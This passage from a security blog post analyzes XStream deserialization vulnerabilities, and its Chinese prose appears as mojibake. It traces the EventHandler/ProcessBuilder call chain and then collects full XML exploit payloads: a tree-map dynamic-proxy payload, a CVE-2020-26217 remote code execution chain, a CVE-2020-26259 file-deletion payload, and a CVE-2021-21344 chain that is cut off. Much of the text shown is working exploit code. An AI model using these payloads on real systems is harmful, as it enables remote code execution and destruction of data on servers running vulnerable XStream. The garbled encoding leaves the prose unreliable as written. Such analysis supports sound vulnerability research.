ˆä¸­å¼€å§‹å…¥æ‰‹åˆ†æï¼Œèƒ½çœ‹å‡ºå…¶å¤§è‡´çš„è°ƒç”¨é“¾æµç¨‹</p><p><img src="https://cdn.clown2024.cn/image-20241106085613877.png" alt="image-20241106085613877"></p><p>å…¶åœ¨AbstractTreeMarshallingStrategy#unmarshalè°ƒç”¨äº†TreeUnmarshaller#startæ–¹æ³•ï¼Œä»è¿™é‡Œå¼€å§‹è§£æxmlå†…å®¹</p><p><img src="https://cdn.clown2024.cn/image-20241106090828942.png" alt="image-20241106090828942"></p><p>è¿™é‡Œä¼šè°ƒç”¨HierarchicalStreams#readClassType()æ¥è·å–åˆ°PoC XMLä¸­æ ¹æ ‡ç­¾çš„ç±»ç±»å‹</p><p>ç´§æ¥ç€ä¸€è·¯å¾€ä¸‹è·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/image-20241106091233168.png" alt="image-20241106091233168"></p><p>å…¶æœ€ç»ˆåœ¨com.thoughtworks.xstream.mapper.ClassAliasingMapper#realClassä¸­æ‰¾åˆ°äº†SortedSetç±»åï¼ŒnameToTypeæ˜¯ä¸€ä¸ªhashMapç±»å‹å˜é‡</p><p>å›åˆ°å‰é¢ï¼Œè¿™é‡Œæ‹¿åˆ°typeä¹‹åå°±å»è°ƒç”¨convertAnotheræ–¹æ³•æ¥å¯¹è¿”å›çš„typeè¿›è¡Œç±»å‹è½¬åŒ–</p><p><img src="https://cdn.clown2024.cn/image-20241106092001977.png" alt="image-20241106092001977"></p><p>è¯¥æ–¹æ³•å†…éƒ¨å°±æ¶‰åŠåˆ°convertorè½¬æ¢å™¨çš„ä½¿ç”¨ï¼Œè·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241106092354449.png" alt="image-20241106092354449"></p><p>å…¶ä¸­è°ƒç”¨mapper.defaultImplementationOf()å‡½æ•°æ¥å¯»æ‰¾java.util.SortedSetç±»å‹çš„é»˜è®¤å®ç°ç±»å‹è¿›è¡Œæ›¿æ¢ï¼Œè¿™é‡Œè½¬æ¢ä¸ºäº†java.util.TreeSetç±»å‹</p><p>ç„¶åå°±æ˜¯è°ƒç”¨converterLookup.lookupConverterForTypeæ–¹æ³•æ¥å¯»æ‰¾TreeSetå¯¹åº”çš„ç±»å‹è½¬æ¢å™¨</p><p><img src="https://cdn.clown2024.cn/image-20241106093118079.png" alt="image-20241106093118079"></p><p>è¯¥æ–¹æ³•é‡Œé¢å°±æ˜¯è·å–è¿­ä»£å™¨å¯¹è±¡ï¼Œç„¶åæ‰¾åˆ°TreeSetå¯¹åº”çš„ç±»å‹è½¬åŒ–å™¨å°±è¿”å›</p><p>è¿”å›ä¹‹åå°±æ˜¯è°ƒç”¨convertè¿›è¡Œç±»å‹è½¬æ¢ï¼Œè°ƒç”¨åˆ°AbstractReferenceUnmarshaller#convertæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241106094933449.png" alt="image-20241106094933449"></p><p>ä¼šè·³è¿‡å‰é¢çš„if-elseåˆ¤æ–­ï¼Œæœ€åè¿›åˆ°elseé‡Œé¢ï¼Œè°ƒç”¨getCurrentReferenceKey()æ¥è·å–å½“å‰çš„Referenceé”®å³æ ‡ç­¾åï¼Œæ¥ç€å°†å½“å‰æ ‡ç­¾åå‹å…¥parentStackæ ˆä¸­ï¼Œkeyçš„ç»“æ„å¦‚ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241106095218106.png" alt="image-20241106095218106"></p><p>ç„¶åè°ƒç”¨å…¶çˆ¶ç±»çš„convertæ–¹æ³•ï¼Œåœ¨é‡Œé¢pushåˆ°FastStackçš„å †æ ˆä¸­</p><p><img src="https://cdn.clown2024.cn/image-20241106103638037.png" alt="image-20241106103638037"></p><p>ç„¶åå°±æ˜¯è°ƒç”¨TreeSetConvertçš„unmarshalæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›åˆ°ä¸€ä¸ªå¡«å……treeMapçš„TreeMapConverter#populateTreeMapæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241106105027698.png" alt="image-20241106105027698"></p><p>è¿™é‡Œå…ˆåˆ¤æ–­æ˜¯å¦æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæ˜¯çš„è¯å°±è°ƒç”¨putCurrentEntryIntoMap()å‡½æ•°ï¼Œå³å°†å½“å‰å†…å®¹å¡«å……åˆ°Mapä¸­</p><p><img src="https://cdn.clown2024.cn/image-20241106105249406.png" alt="image-20241106105249406"></p><p>é‡Œé¢è°ƒç”¨readItem()å‡½æ•°è¯»å–æ ‡ç­¾å†…çš„å†…å®¹å¹¶ç¼“å­˜åˆ°targetè¿™ä¸ªMapä¸­ï¼Œè·Ÿè¿›å»ç›´åˆ°com.thoughtworks.xstream.mapper.CachingMapper#realClass</p><p><img src="https://cdn.clown2024.cn/image-20241106105555385.png" alt="image-20241106105555385"></p><p>è¿™é‡Œå°±ä¼šå»å¯»æ‰¾dynamic-proxyæ‰€å¯¹åº”çš„ç±»ï¼Œä¸€è·¯è·Ÿè¿›ï¼Œå…¶å¯»æ‰¾çš„æµç¨‹å’Œå‰é¢çš„ç±»ä¼¼</p><p><img src="https://cdn.clown2024.cn/image-20241106110001573.png" alt="image-20241106110001573"></p><p>æœ€åæ˜¯æ‰¾åˆ°äº†DynamicProxyè¿™ä¸ªç±»</p><p>ç„¶åå›åˆ°readItemæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241106110155902.png" alt="image-20241106110155902"></p><p>è·å–åˆ°typeä¹‹åï¼Œå°±å»è°ƒç”¨convertAnotheræ–¹æ³•ï¼Œå’Œå‰é¢ä¸€æ ·å»æ‰¾ç±»å‹è½¬æ¢å™¨</p><p><img src="https://cdn.clown2024.cn/image-20241106110438659.png" alt="image-20241106110438659"></p><p>ä¹‹åä¹Ÿæ˜¯å·®ä¸å¤šçš„æµç¨‹ï¼Œä¸€ç›´åˆ°ä¸‹é¢è¿™ä¸ªå…³é”®çš„åœ°æ–¹ï¼Œcom.thoughtworks.xstream.converters.extended.DynamicProxyConverter#unmarshalæ–¹æ³•å†…éƒ¨</p><p><img src="https://cdn.clown2024.cn/image-20241106110843531.png" alt="image-20241106110843531"></p><p>è¿™é‡ŒæŒ‰æ ‡ç­¾å†…å®¹ç”Ÿæˆå¯¹åº”æ¥å£çš„åŠ¨æ€ä»£ç†ï¼Œæ­¤æ—¶è¿™ä¸ªDUMMYæ˜¯ä¸€ä¸ªç©ºçš„ä»£ç†å®ç°</p><p><img src="https://cdn.clown2024.cn/image-20241106113729142.png" alt="image-20241106113729142"></p><p>ç»§ç»­å¾€ä¸‹æ‰§è¡Œhandler &#x3D; (InvocationHandler)context.convertAnother(proxy, handlerType);</p><p><img src="https://cdn.clown2024.cn/image-20241106113843979.png" alt="image-20241106113843979"></p><p>ç„¶ååˆæ˜¯è°ƒç”¨ç›¸å…³è½¬æ¢å™¨æœ€ç»ˆå¾—åˆ°EventHandler</p><p><img src="https://cdn.clown2024.cn/image-20241106114015121.png" alt="image-20241106114015121"></p><p>ç„¶ååé¢åˆæ˜¯å¾ªç¯å¾—è¯»å–æ ‡ç­¾è·å–å¯¹åº”å¾—ç±»å’Œå†…å®¹</p><p>å›åˆ°å‰é¢è·å–handlerçš„åœ°æ–¹ï¼Œå†å¾€ä¸‹å°±æ˜¯æ›¿æ¢ä»£ç†</p><p><img src="https://cdn.clown2024.cn/image-20241106114840135.png" alt="image-20241106114840135"></p><p>ç„¶åå†å›åˆ°å‰é¢çš„TreeMapConverter#populateTreeMapï¼Œè¿™é‡Œä¼šæŠŠç»“æœæŠŠå­˜åˆ°result</p><p><img src="https://cdn.clown2024.cn/image-20241106115157218.png" alt="image-20241106115157218"></p><p>è¿™é‡Œçš„resultå°±æ˜¯TreeMapï¼Œç„¶åé‡Œé¢å°±ä¼šè§¦å‘æˆ‘ä»¬çš„åŠ¨æ€ä»£ç†æ–¹æ³•äº†</p><p>å› ä¸ºæˆ‘ä»¬çš„xmlé…ç½®ä»£ç†çš„æ¥å£æ˜¯Comparableï¼Œç„¶åTreeMapåœ¨è°ƒç”¨putAllæ–¹æ³•çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨åˆ°putæ–¹æ³•ï¼Œè€Œé‡Œé¢è°ƒç”¨äº†compareæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241106121046532.png" alt="image-20241106121046532"></p><p>æœ€ç»ˆå°±ä¼šèµ°åˆ°EventHandler#invokeInternalæ–¹æ³•é‡Œé¢ï¼Œç„¶ååå°„è°ƒç”¨ProcessBuilderçš„startæ–¹æ³•è§¦å‘å‘½ä»¤æ‰§è¡Œ</p><p><img src="https://cdn.clown2024.cn/image-20241106121145638.png" alt="image-20241106121145638"></p><h3 id="å…¶ä»–è¯´æ˜"><a href="#å…¶ä»–è¯´æ˜" class="headerlink" title="å…¶ä»–è¯´æ˜"></a>å…¶ä»–è¯´æ˜</h3><p>åœ¨å°äºç­‰äº1.3.1ç‰ˆæœ¬ï¼Œè¿è¡ŒæŠ¥é”™æ˜¾ç¤ºTreeMapæ²¡æœ‰åŒ…å«comparatorå…ƒç´ ï¼Œå³ä¸æ”¯æŒPoCä¸­ä¸¤ä¸ªå­æ ‡ç­¾å…ƒç´ è°ƒç”¨compareTo()è¿›è¡Œæ¯”è¾ƒï¼Œå› æ­¤æ— æ³•åˆ©ç”¨</p><p><strong>1.4.1-1.4.4æ— æ³•è§¦å‘çš„åŸå› </strong></p><p>åœ¨TreeSetConverter.unmarshal()ä¸­ï¼Œåªæœ‰å½“sortedMapFieldå’ŒtreeMapä¸ä¸ºnullæ—¶ï¼Œæ‰èƒ½è¿›å…¥populateTreeMap()</p><p><img src="https://cdn.clown2024.cn/image-20241106122009384.png" alt="image-20241106122009384"></p><p>è€Œ1.4.1-1.4.4ç‰ˆæœ¬ä¸­ï¼ŒsortedMapFieldé»˜è®¤ä¸ºnull</p><p><img src="https://cdn.clown2024.cn/image-20241106122129571.png" alt="image-20241106122129571"></p><p><strong>1.4.7-1.4.9æ— æ³•è§¦å‘çš„åŸå› </strong></p><p>ReflectionConverter.canConvert()å‡½æ•°ä¸­æ·»åŠ äº†å¯¹EventHandlerç±»çš„è¿‡æ»¤</p><h2 id="tree-map"><a href="#tree-map" class="headerlink" title="tree-map"></a>tree-map</h2><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬-1" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><p>ç‰ˆæœ¬&lt;&#x3D;1.4.6æˆ–&#x3D;1.4.10</p><p>payload</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">tree-map</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dynamic-proxy</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>java.lang.Comparable<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">handler</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.EventHandler&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">handler</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dynamic-proxy</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>good<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tree-map</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="æµç¨‹è¯´æ˜"><a href="#æµç¨‹è¯´æ˜" class="headerlink" title="æµç¨‹è¯´æ˜"></a>æµç¨‹è¯´æ˜</h3><p>è¿™é‡Œå…¶å®å°±å’Œsortedçš„è¿‡ç¨‹æ˜¯å·®ä¸å¤šçš„ï¼Œå°±ä¸åšè¿‡å¤šçš„åˆ†æäº†</p><p>ä»–å’Œsorted-setçš„åŒºåˆ«å°±æ˜¯åœ¨TreeMapConverter#unmarshalçš„åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/image-20241106141841502.png" alt="image-20241106141841502"></p><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰TreeSetConverteré‚£ä¹ˆå¤šçš„é™åˆ¶</p><p>ä¸»è¦è¿˜æ˜¯è®°ä¸€ä¸‹payloadä»¥åŠä½¿ç”¨ç‰ˆæœ¬ï¼Œä»¥åŠåé¢ä¹Ÿæ˜¯åªæ”¶é›†ä¸€äº›CVEçš„payload</p><h3 id="å…¶ä»–è¯´æ˜"><a href="#å…¶ä»–è¯´æ˜-1" class="headerlink" title="å…¶ä»–è¯´æ˜"></a>å…¶ä»–è¯´æ˜</h3><p><strong>åœ¨&lt;&#x3D;1.3.1ç‰ˆæœ¬</strong></p><p>ä¼šæŠ¥é”™æ˜¾ç¤ºTreeMapæ²¡æœ‰åŒ…å«comparatorå…ƒç´ ï¼Œå³ä¸æ”¯æŒPoCä¸­ä¸¤ä¸ªå­æ ‡ç­¾å…ƒç´ è°ƒç”¨compareTo()è¿›è¡Œæ¯”è¾ƒï¼Œå› æ­¤æ— æ³•åˆ©ç”¨ï¼Œä¸sorted-setåŸå› ä¸€æ ·</p><p><strong>1.4.7-1.4.9ç‰ˆæœ¬</strong></p><p>ReflectionConverter.canConvert()å‡½æ•°ä¸­æ·»åŠ äº†å¯¹EventHandlerç±»çš„è¿‡æ»¤</p><h1 id="payloadæ”¶é›†"><a href="#payloadæ”¶é›†" class="headerlink" title="payloadæ”¶é›†"></a>payloadæ”¶é›†</h1><h2 id="cve-2020-26217è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#CVE-2020-26217è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="CVE-2020-26217è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>CVE-2020-26217è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h2><p>å½±å“ç‰ˆæœ¬&lt;&#x3D;1.4.13</p><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">flags</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataHandler</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">contentType</span>&gt;</span>text/plain<span class="hljs-tag">&lt;/<span class="hljs-name">contentType</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">is</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">e</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">iterator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">iter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">cursor</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">cursor</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">lastRet</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">lastRet</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">expectedModCount</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">expectedModCount</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">outer-class</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">java.lang.ProcessBuilder</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">java.lang.ProcessBuilder</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">outer-class</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">iter</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">method</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">method</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">next</span>/&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">iterator</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>KEYS<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">e</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">in</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">buf</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">buf</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">pos</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">pos</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">mark</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">mark</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">count</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">count</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">in</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">is</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">consumed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">consumed</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">transferFlavors</span>/&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">dataHandler</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">dataLen</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241106145534172.png" alt="image-20241106145534172"></p><h2 id="cve-2020-26259ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"><a href="#CVE-2020-26259ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´" class="headerlink" title="CVE-2020-26259ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"></a>CVE-2020-26259ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´</h2><p>å½±å“ç‰ˆæœ¬&lt;1.4.14</p><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">flags</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataHandler</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">contentType</span>&gt;</span>text/plain<span class="hljs-tag">&lt;/<span class="hljs-name">contentType</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">is</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.util.ReadAllStream$FileStream&#x27;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">tempFile</span>&gt;</span>test.txt<span class="hljs-tag">&lt;/<span class="hljs-name">tempFile</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">is</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">transferFlavors</span>/&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">dataHandler</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">dataLen</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªtxtåœ¨é¡¹ç›®æ ¹ç›®å½•</p><p><img src="https://cdn.clown2024.cn/image-20241106145406896.png" alt="image-20241106145406896"></p><p>ç„¶åæˆåŠŸåˆ é™¤</p><h2 id="cve-2021-21344è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#CVE-2021-21344è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="CVE-2021-21344è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>CVE-2021-21344è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h2><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">unserializable-parents</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">size</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">size</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">comparator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">indexMap</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">packet</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">message</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">bi</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-tag">&lt;/<span class="hljs-name">jaxbType</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">uriProperties</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">attributeProperties</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">inheritedAttWildcard</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">getter</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>getDatabaseMetaData<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">getter</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">inheritedAttWildcard</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">bi</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">tagName</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">context</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">marshallerPool</span> <span 